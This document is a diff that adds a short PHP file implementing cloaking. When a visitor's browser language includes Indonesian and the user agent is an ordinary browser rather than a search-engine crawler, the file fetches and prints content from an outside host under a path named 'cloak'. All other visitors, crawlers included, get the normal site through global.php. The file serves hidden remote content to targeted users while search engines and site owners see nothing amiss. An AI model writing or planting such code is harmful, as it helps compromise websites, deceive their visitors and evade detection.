@@ -1,0 +1,22 @@
+<?php
+function is_indonesian_browser() {
+    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
+        return (stripos($_SERVER['HTTP_ACCEPT_LANGUAGE'], 'id') !== false);
+    }
+    return false;
+}
+
+function is_regular_browser() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return preg_match('/(Chrome|Firefox|Safari|Edge|Opera|SamsungBrowser|UCBrowser)/i', $ua)
+        && !preg_match('/(bot|spider|crawl|slurp|bing|yandex|baidu|duckduckgo|google)/i', $ua);
+}
+
+if (is_indonesian_browser() && is_regular_browser()) {
+    echo file_get_contents('https://tereasite.pro/cloak/huta.txt');
+    exit;
+} else {
+    include('global.php');
+    exit;
+}
+?>
